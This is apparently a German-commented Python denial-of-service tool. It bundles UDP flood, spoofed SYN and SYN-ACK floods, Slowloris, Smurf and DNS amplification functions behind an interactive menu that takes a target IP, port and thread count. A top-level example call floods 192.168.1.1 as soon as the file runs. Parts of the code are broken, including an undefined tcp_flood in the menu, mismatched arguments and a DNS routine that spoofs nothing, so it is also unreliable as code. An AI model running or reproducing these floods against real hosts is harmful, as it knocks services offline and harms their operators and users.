import os
import random
import socket
import threading
import time
import sys

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# Banner mit Anpassungsmöglichkeiten
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝      ╚═════╝ ╚══════╝
    """)
    print("\033[0m")

# UDP Flood
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
        except:
            pass

# TCP Flood (syn_ack_flood)
from scapy.all import *

def syn_ack_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        # Gefälschte Quelle (kann zufällig sein)
        src_ip = RandIP()
        src_port = RandShort()
        
        # SYN-ACK Paket erstellen
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags='SA')  # SYN-ACK Flags
        packet = ip_layer / tcp_layer
        
        # Paket senden
        send(packet, verbose=False)

# Beispielaufruf
syn_ack_flood("192.168.1.1", 80, 1000)

# Syn Flood 
def syn_flood(target_ip, target_port, duration, threads):
    def attack():
        while time.time() < end_time:
            try:
                # Erstelle ein RAW-Socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                # Fälsche eine Quell-IP-Adresse
                source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                source_port = random.randint(1024, 65535)

                # TCP-Header erstellen
                packet = create_syn_packet(source_ip, source_port, target_ip, target_port)

                # Sende das Paket
                sock.sendto(packet, (target_ip, target_port))
            except Exception as e:
                # Fehlerprotokollierung
                print(f"Fehler beim Senden: {e}")

    def create_syn_packet(source_ip, source_port, target_ip, target_port):
        # IP-Header
        ip_header = create_ip_header(source_ip, target_ip)

        # TCP-Header
        tcp_header = create_tcp_header(source_ip, source_port, target_ip, target_port)

        return ip_header + tcp_header

    def create_ip_header(source_ip, target_ip):
        # Minimaler IP-Header
        ip_header = bytearray(20)
        ip_header[0] = 0x45  # Version (4) und Header-Länge (5)
        ip_header[1] = 0  # Type of Service
        ip_header[2:4] = (40).to_bytes(2, byteorder='big')  # Gesamtlänge
        ip_header[8] = 64  # TTL
        ip_header[9] = socket.IPPROTO_TCP  # Protokoll
        ip_header[12:16] = socket.inet_aton(source_ip)  # Quell-IP
        ip_header[16:20] = socket.inet_aton(target_ip)  # Ziel-IP
        return ip_header

    def create_tcp_header(source_ip, source_port, target_ip, target_port):
        # Minimaler TCP-Header
        tcp_header = bytearray(20)
        tcp_header[0:2] = source_port.to_bytes(2, byteorder='big')  # Quell-Port
        tcp_header[2:4] = target_port.to_bytes(2, byteorder='big')  # Ziel-Port
        tcp_header[4:8] = (random.randint(0, 4294967295)).to_bytes(4, byteorder='big')  # Sequence Number
        tcp_header[12] = 0x50  # Data Offset
        tcp_header[13] = 0x02  # Flags (SYN)
        tcp_header[14:16] = (5840).to_bytes(2, byteorder='big')  # Window Size
        return tcp_header

    # Angriffstimer starten
    end_time = time.time() + duration

    # Threads starten
    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

# Slowloris (TCP Keep-Alive)
def slowloris(ip, port):
    global packet_counter
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    while not stop_event.is_set():
        for sock in sockets:
            try:
                sock.send(b"X-a: Keep-alive\r\n")
                packet_counter += 1
            except:
                sockets.remove(sock)

# Smurf Attack, 19
from struct import pack
from random import randint
from ctypes import Structure, c_ubyte, c_ushort, c_uint

class IPHeader(Structure):
    _fields_ = [
        ("ihl", c_ubyte, 4),          # Internet Header Length
        ("version", c_ubyte, 4),      # Version
        ("tos", c_ubyte),             # Type of Service
        ("length", c_ushort),         # Total Length
        ("id", c_ushort),             # Identification
        ("offset", c_ushort),         # Flags and Fragment Offset
        ("ttl", c_ubyte),             # Time to Live
        ("protocol", c_ubyte),        # Protocol
        ("checksum", c_ushort),       # Header Checksum
        ("src", c_uint),              # Source Address
        ("dst", c_uint),              # Destination Address
    ]

    def __init__(self, src, dst):
        self.version = 4
        self.ihl = 5
        self.tos = 0
        self.length = 0
        self.id = randint(0, 65535)
        self.offset = 0
        self.ttl = 64
        self.protocol = socket.IPPROTO_ICMP
        self.checksum = 0
        self.src = socket.inet_aton(src)
        self.dst = socket.inet_aton(dst)

class ICMPHeader(Structure):
    _fields_ = [
        ("type", c_ubyte),
        ("code", c_ubyte),
        ("checksum", c_ushort),
        ("id", c_ushort),
        ("sequence", c_ushort),
    ]

    def __init__(self, icmp_type, code):
        self.type = icmp_type
        self.code = code
        self.checksum = 0
        self.id = randint(0, 65535)
        self.sequence = 0

    def calculate_checksum(self, packet):
        if len(packet) % 2 != 0:
            packet += b'\x00'
        checksum = sum((packet[i] << 8) + packet[i + 1] for i in range(0, len(packet), 2))
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF

def smurf_attack(target_ip, broadcast_ip, duration, threads):
    lock = threading.Lock()
    stats = {"packets_sent": 0}
    stop_event = threading.Event()

    def send_icmp():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        ip_header = IPHeader(target_ip, broadcast_ip)
        icmp_header = ICMPHeader(8, 0)  # ICMP Echo Request (type 8, code 0)

        packet = pack('!BBHHH', icmp_header.type, icmp_header.code, 0, icmp_header.id, icmp_header.sequence)
        icmp_header.checksum = icmp_header.calculate_checksum(packet)
        packet = pack('!BBHHH', icmp_header.type, icmp_header.code, icmp_header.checksum, icmp_header.id, icmp_header.sequence)
        raw_packet = ip_header + packet

        while not stop_event.is_set():
            try:
                sock.sendto(raw_packet, (broadcast_ip, 0))
                with lock:
                    stats["packets_sent"] += 1
            except Exception as e:
                print(f"Error sending packet: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_icmp)
        thread.start()
        thread_list.append(thread)

    time.sleep(duration)
    stop_event.set()

    for thread in thread_list:
        thread.join()

    print(f"Packets sent: {stats['packets_sent']}")

# Beispielaufruf (nur für Bildungszwecke):
# smurf_attack("192.168.1.10", "192.168.1.255", 10, 4)

# DNS Amplification

def send_dns_query(ip, dns_query):
    """Sendet eine einzelne DNS-Anfrage an den angegebenen Server."""
    try:
        # UDP-Socket erstellen
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Zufällige Quell-IP simulieren (Spoofing ist hier theoretisch)
        spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        # DNS-Anfrage senden
        sock.sendto(dns_query, (ip, 53))
    except Exception as e:
        print(f"Fehler beim Senden der Anfrage: {e}")
    finally:
        sock.close()

def attack_thread(ip, dns_query, duration):
    """Führt den Angriff in einem Thread aus."""
    end_time = time.time() + duration
    while time.time() < end_time:
        send_dns_query(ip, dns_query)

def dns_amplification_attack(ip, duration, threads):
    """
    Führt einen DNS-Amplification-Angriff aus.
    :param ip: Ziel-IP-Adresse (DNS-Server)
    :param duration: Dauer des Angriffs in Sekunden
    :param threads: Anzahl der Threads
    """
    # Beispiel DNS-Anfrage mit "ANY"-Typ, um große Antworten zu erzwingen
    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 b"\x07example\x03com\x00\x00\xff\x00\x01")  # Typ "ANY"

    print(f"Start des DNS-Amplification-Angriffs auf {ip} für {duration} Sekunden mit {threads} Threads.")
    
    # Threads starten
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack_thread, args=(ip, dns_query, duration))
        thread_list.append(thread)
        thread.start()

    # Auf Threads warten
    for thread in thread_list:
        thread.join()

    print("Angriff beendet.")

# Menü zur Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Live-Dashboard
def dashboard():
    global packet_counter
    while not stop_event.is_set():
        print(f"\r[INFO] Gesendete Pakete: {packet_counter}", end="")
        time.sleep(1)

# Hauptprogramm
if __name__ == "__main__":
    color = choose_color()
    show_banner(color)

    while True:
        print("1 - UDP Flood")
        print("2 - TCP Flood")
        print("3 - Slowloris Attack")
        print("4 - Beenden")
        choice = input("Wähle eine Option: ")

        if choice in ["1", "2", "3"]:
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            packet_size = int(input("Paketgröße in Bytes: "))
            num_threads = int(input("Anzahl der Threads: "))

            attack_function = {
                "1": udp_flood,
                "2": tcp_flood,
                "3": slowloris,
            }.get(choice)

            stop_event.clear()
            threads = [
                threading.Thread(target=attack_function, args=(ip, port, packet_size))
                for _ in range(num_threads)
            ]
            for thread in threads:
                thread.daemon = True
                thread.start()

            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.daemon = True
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()

        elif choice == "4":
            print("[INFO] Programm beendet.")
            sys.exit()
